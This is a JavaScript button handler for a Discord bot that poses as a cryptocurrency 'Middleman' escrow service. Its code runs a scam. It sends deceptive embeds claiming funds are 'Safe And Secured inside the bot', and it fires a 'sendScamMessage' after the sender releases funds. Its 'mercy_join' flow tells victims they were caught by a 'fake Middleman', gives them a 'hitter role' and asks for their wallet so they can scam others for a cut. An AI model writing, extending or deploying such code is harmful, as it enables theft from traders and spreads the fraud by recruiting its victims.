const {
  EmbedBuilder,
  ActionRowBuilder,
  ButtonBuilder,
  ButtonStyle,
  AttachmentBuilder,
} = require('discord.js');
const path = require('path');
const { sendPaymentInvoice } = require('./dealHandler');
const { sendScamMessage } = require('../utils/monitor');

async function handleButton(interaction, client) {
  const deal = client.activeDeals.get(interaction.channel.id);

  // Close ticket
  if (interaction.customId === 'close_ticket') {
    await interaction.reply({ content: 'Closing ticket...', ephemeral: true });
    setTimeout(() => interaction.channel.delete().catch(() => {}), 3000);
    client.activeDeals.delete(interaction.channel.id);
    return;
  }

  // Copy details
  if (interaction.customId === 'copy_details') {
    if (!deal) { await interaction.reply({ content: 'No active deal found.', ephemeral: true }); return; }
    await interaction.reply({ content: deal.address });
    await interaction.followUp({ content: deal.cryptoAmount });
    return;
  }

  // Release funds — show confirm/incorrect first
  if (interaction.customId === 'release_funds') {
    if (!deal) { await interaction.reply({ content: 'No active deal found.', ephemeral: true }); return; }
    if (deal.receiver && interaction.user.id === deal.receiver) {
      await interaction.reply({ content: 'The **Receiver** cannot release the funds.', ephemeral: true }); return;
    }
    if (deal.sender && interaction.user.id !== deal.sender) {
      await interaction.reply({ content: 'Only the **Sender** can release the funds.', ephemeral: true }); return;
    }

    const confirmEmbed = new EmbedBuilder()
      .setColor(0xfdd835)
      .setTitle('Confirm Release')
      .setDescription('Are you sure you want to release the funds? This action cannot be undone.');

    const confirmRow = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setCustomId('confirm_release').setLabel('Confirm').setStyle(ButtonStyle.Success),
      new ButtonBuilder().setCustomId('incorrect_release').setLabel('Incorrect').setStyle(ButtonStyle.Secondary),
    );

    await interaction.update({ embeds: [confirmEmbed], components: [confirmRow] });
    return;
  }

  // Confirm release — send scam message then close
  if (interaction.customId === 'confirm_release') {
    if (!deal) { await interaction.reply({ content: 'No active deal found.', ephemeral: true }); return; }
    if (deal.receiver && interaction.user.id === deal.receiver) {
      await interaction.reply({ content: 'The **Receiver** cannot confirm the release.', ephemeral: true }); return;
    }
    if (deal.sender && interaction.user.id !== deal.sender) {
      await interaction.reply({ content: 'Only the **Sender** can confirm the release.', ephemeral: true }); return;
    }

    const releaseEmbed = new EmbedBuilder()
      .setColor(0x00c853)
      .setTitle('Deal Complete')
      .setDescription(`Funds have been released to <@${deal.receiver}>.\n\nThank you for using our Middleman service.`);

    await interaction.update({ embeds: [releaseEmbed], components: [] });

    // Send scam message pinging the receiver
    try {
      await sendScamMessage(interaction.channel, deal);
    } catch (e) {}

    client.activeDeals.delete(interaction.channel.id);
    return;
  }

  // Incorrect release — go back to Release/Cancel
  if (interaction.customId === 'incorrect_release') {
    const txEmbed = new EmbedBuilder()
      .setColor(0x00c853)
      .setTitle('Transaction has been detected')
      .setDescription('Amount Has Been Received, Its Safe And Secured inside the bot, Now Please Proceed With your Deal, Once Done Ask Sender To Release.');

    const actionRow = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setCustomId('release_funds').setLabel('Release').setStyle(ButtonStyle.Success),
      new ButtonBuilder().setCustomId('cancel_deal').setLabel('Cancel').setStyle(ButtonStyle.Danger),
    );

    await interaction.update({ embeds: [txEmbed], components: [actionRow] });
    return;
  }

  // Cancel deal
  if (interaction.customId === 'cancel_deal') {
    if (!deal) { await interaction.reply({ content: 'No active deal found.', ephemeral: true }); return; }
    if (interaction.user.id !== deal.sender) {
      await interaction.reply({ content: 'Only the **Sender** can cancel the deal.', ephemeral: true }); return;
    }

    const cancelEmbed = new EmbedBuilder()
      .setColor(0xe53935)
      .setTitle('Deal Cancelled')
      .setDescription('This deal has been cancelled. This ticket will close in 10 seconds.');

    await interaction.update({ embeds: [cancelEmbed], components: [] });
    client.activeDeals.delete(interaction.channel.id);
    setTimeout(() => interaction.channel.delete().catch(() => {}), 10000);
    return;
  }

  // Join Us — give mercy role, then if scam deal pending ask for wallet address
  if (interaction.customId === 'mercy_join') {
    const { getMercyRoleId } = require('../utils/settings');
    const mercyRoleId = getMercyRoleId();

    await interaction.deferReply({ ephemeral: false });

    if (!mercyRoleId) {
      await interaction.editReply({ content: '⚠️ No mercy role has been set. Ask an admin to run `.setmercyrole @role`.' });
      return;
    }

    let member;
    try {
      member = await interaction.guild.members.fetch(interaction.user.id);
      await member.roles.add(mercyRoleId);
    } catch (e) {
      await interaction.editReply({ content: 'Failed to assign the role. Check bot permissions.' });
      return;
    }

    const welcomeMsg =
      `<@${interaction.user.id}> Welcome! Now you're part of our fake Middleman — which is how we got you — so you can hit on others and take your revenge.\n\n` +
      `Check the guide channel for tips and guides.\n\n` +
      `You've also received <@&${mercyRoleId}> — our hitter role. Keep it safe.\n` +
      `<@${interaction.user.id}> has accepted his faith, and wanted to join us.`;

    await interaction.editReply({ content: welcomeMsg });

    // If this is inside a scam-mode deal, now ask for receiver's wallet address
    const dealForChannel = client ? client.activeDeals.get(interaction.channel.id) : null;
    if (dealForChannel && dealForChannel.step === 'scam_join_pending') {
      dealForChannel.step = 'await_receiver_address';
      dealForChannel.scamMode = true;
      const displayCoin = dealForChannel.detectedCoin || (dealForChannel.coin === 'USDT [ERC-20]' ? 'USDT' : dealForChannel.coin);
      await interaction.channel.send({
        content: `<@${interaction.user.id}>`,
        embeds: [
          new EmbedBuilder()
            .setColor(0x00c853)
            .setDescription(`Please type your **${displayCoin}** wallet address below to receive your cut.`)
        ]
      });
    }
    return;
  }

  // Leave — dismiss
  if (interaction.customId === 'mercy_leave') {
    await interaction.reply({ content: 'You have chosen to leave. Goodbye.', ephemeral: true });
    return;
  }

  if (!deal) return;

  // Role selection
  if (interaction.customId === 'role_sender') {
    const userId = interaction.user.id;
    if (userId !== deal.initiator && userId !== deal.partner) {
      await interaction.reply({ content: 'You are not part of this deal.', ephemeral: true }); return;
    }
    if (deal.receiver === userId) {
      await interaction.reply({ content: 'You are already the **Receiver**. One role per user.', ephemeral: true }); return;
    }
    if (deal.sender && deal.sender !== userId) {
      await interaction.reply({ content: 'The **Sender** role is already taken.', ephemeral: true }); return;
    }
    deal.sender = userId;
    await interaction.deferUpdate();
    await updateRoleEmbed(interaction, deal);
    await checkRolesComplete(interaction, deal);
    return;
  }

  if (interaction.customId === 'role_receiver') {
    const userId = interaction.user.id;
    if (userId !== deal.initiator && userId !== deal.partner) {
      await interaction.reply({ content: 'You are not part of this deal.', ephemeral: true }); return;
    }
    if (deal.sender === userId) {
      await interaction.reply({ content: 'You are already the **Sender**. One role per user.', ephemeral: true }); return;
    }
    if (deal.receiver && deal.receiver !== userId) {
      await interaction.reply({ content: 'The **Receiver** role is already taken.', ephemeral: true }); return;
    }
    deal.receiver = userId;
    await interaction.deferUpdate();
    await updateRoleEmbed(interaction, deal);
    await checkRolesComplete(interaction, deal);
    return;
  }

  if (interaction.customId === 'role_reset') {
    deal.sender = null;
    deal.receiver = null;
    deal.rolesConfirmed = { sender: false, receiver: false };
    await interaction.deferUpdate();
    await updateRoleEmbed(interaction, deal);
    return;
  }

  // Role confirmation buttons
  if (interaction.customId === 'confirm_roles') {
    const userId = interaction.user.id;
    if (userId === deal.sender) deal.rolesConfirmed.sender = true;
    if (userId === deal.receiver) deal.rolesConfirmed.receiver = true;

    if (deal.rolesConfirmed.sender || deal.rolesConfirmed.receiver) {
      await interaction.reply({
        embeds: [
          new EmbedBuilder().setColor(0x00c853).setDescription(`<@${userId}> has confirmed their role.`)
        ]
      });
    }

    if (deal.rolesConfirmed.sender && deal.rolesConfirmed.receiver) {
      deal.step = 'await_amount';
      const amountEmbed = new EmbedBuilder()
        .setColor(0xfdd835)
        .setTitle('Deal Amount')
        .setDescription(
          'State the amount the bot is expected to receive in USD (e.g., 100.59)\n\nTicket will be closed in 30 minutes if left unattended'
        );
      await interaction.channel.send({ content: `<@${deal.sender}>`, embeds: [amountEmbed] });
    }
    return;
  }

  if (interaction.customId === 'incorrect_roles') {
    deal.sender = null;
    deal.receiver = null;
    deal.rolesConfirmed = { sender: false, receiver: false };
    deal.step = 'await_roles';
    await interaction.reply({ content: 'Roles have been reset. Please re-select.', ephemeral: true });
    return;
  }

  // Amount confirmation — both sender AND receiver must confirm
  if (interaction.customId === 'confirm_amount') {
    const userId = interaction.user.id;
    if (userId !== deal.sender && userId !== deal.receiver) {
      await interaction.reply({ content: 'Only deal participants can confirm the amount.', ephemeral: true });
      return;
    }
    if (!deal.amountConfirmed || typeof deal.amountConfirmed !== 'object') {
      deal.amountConfirmed = { sender: false, receiver: false };
    }
    if (userId === deal.sender) deal.amountConfirmed.sender = true;
    if (userId === deal.receiver) deal.amountConfirmed.receiver = true;

    await interaction.reply({
      embeds: [new EmbedBuilder().setColor(0x00c853).setDescription(`<@${userId}> has confirmed the deal amount.`)]
    });

    if (deal.amountConfirmed.sender && deal.amountConfirmed.receiver) {
      deal.step = 'sending_invoice';
      await sendPaymentInvoice(interaction.channel, deal);
    }
    return;
  }

  if (interaction.customId === 'incorrect_amount') {
    deal.amount = null;
    deal.amountConfirmed = { sender: false, receiver: false };
    deal.step = 'await_amount';
    await interaction.reply({ content: 'Please re-enter the deal amount.', ephemeral: true });
    return;
  }
}

async function updateRoleEmbed(interaction, deal) {
  const senderText = deal.sender ? `<@${deal.sender}>` : 'None';
  const receiverText = deal.receiver ? `<@${deal.receiver}>` : 'None';

  const embed = new EmbedBuilder()
    .setColor(0x00c853)
    .setTitle('Role Assignment')
    .setDescription(
      'Select one of the following buttons that corresponds to your role in this deal. Once selected, both users must confirm to proceed.\n\n' +
      `**Sender**\n${senderText}\n**Receiver**\n${receiverText}\n\n` +
      'The ticket will be closed in 30 minutes if left unattended'
    );

  const roleRow = new ActionRowBuilder().addComponents(
    new ButtonBuilder().setCustomId('role_sender').setLabel('Sender').setStyle(ButtonStyle.Secondary),
    new ButtonBuilder().setCustomId('role_receiver').setLabel('Receiver').setStyle(ButtonStyle.Secondary),
    new ButtonBuilder().setCustomId('role_reset').setLabel('Reset').setStyle(ButtonStyle.Danger),
  );

  try {
    await interaction.message.edit({ embeds: [embed], components: [roleRow] });
  } catch (e) {}
}

async function checkRolesComplete(interaction, deal) {
  if (deal.sender && deal.receiver) {
    const confirmEmbed = new EmbedBuilder()
      .setColor(0x00c853)
      .setTitle('Role Confirmation')
      .setDescription('Both roles are assigned. Please confirm to proceed.')
      .addFields(
        { name: 'Sender', value: `<@${deal.sender}>`, inline: false },
        { name: 'Receiver', value: `<@${deal.receiver}>`, inline: false },
      );

    const confirmRow = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setCustomId('confirm_roles').setLabel('Confirm').setStyle(ButtonStyle.Success),
      new ButtonBuilder().setCustomId('incorrect_roles').setLabel('Incorrect').setStyle(ButtonStyle.Secondary),
    );

    await interaction.channel.send({ embeds: [confirmEmbed], components: [confirmRow] });
  }
}

module.exports = { handleButton };
